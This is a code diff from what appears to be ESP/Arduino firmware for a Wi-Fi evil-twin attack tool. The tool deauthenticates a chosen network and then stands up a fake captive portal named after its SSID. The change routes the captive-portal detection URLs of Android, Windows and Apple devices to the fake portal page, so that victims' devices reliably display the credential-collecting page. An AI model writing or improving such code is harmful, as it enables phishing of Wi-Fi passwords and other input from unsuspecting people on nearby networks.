@@ -649,34 +649,15 @@ void loop() {
             String path = parseRequest(request);
             Serial.println(request);
             
-            // Captive portal detection URLs - return 302 redirect or non-success response
-            if(path.startsWith("/generate_204") || path.startsWith("/gen_204")) {
-              // Android captive portal check
-              String response = makeResponse(302, "text/html", false);
-              client.write(response.c_str());
-              break;
+            // Serve portal for all captive portal detection URLs and main portal pages
+            if(path.startsWith("/generate_204") || path.startsWith("/gen_204") ||
+               path.startsWith("/ncsi.txt") || path.startsWith("/connecttest.txt") ||
+               path.startsWith("/hotspot-detect.html") || path.startsWith("/library/test/success.html") ||
+               path.startsWith("/success.txt") || path.startsWith("/success.html") ||
+               path.startsWith("/redirect") ||
+               path.startsWith("/userinput") || path.startsWith("/login") || 
+               path.startsWith("/?") || path.equals("/") || path.startsWith("/get")) {
               
-            } else if(path.startsWith("/hotspot-detect.html") || 
-                      path.startsWith("/library/test/success.html") ||
-                      path.startsWith("/success.txt")) {
-              // iOS/macOS captive portal check - serve portal instead of success
-              if (deauth_wifis.size() != 0)
-                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
-              else
-                handleRequest(client, (enum portals)portal, "router");
-              break;
-              
-            } else if(path.startsWith("/ncsi.txt") || 
-                      path.startsWith("/connecttest.txt") ||
-                      path.startsWith("/redirect")) {
-              // Windows captive portal check
-              String response = makeResponse(302, "text/html", false);
-              client.write(response.c_str());
-              break;
-              
-            } else if(path.startsWith("/userinput") || path.startsWith("/login") || 
-                      path.startsWith("/?") || path.equals("/") || path.startsWith("/get")) {
-              // Main portal pages
               if (deauth_wifis.size() != 0)
                 handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
               else
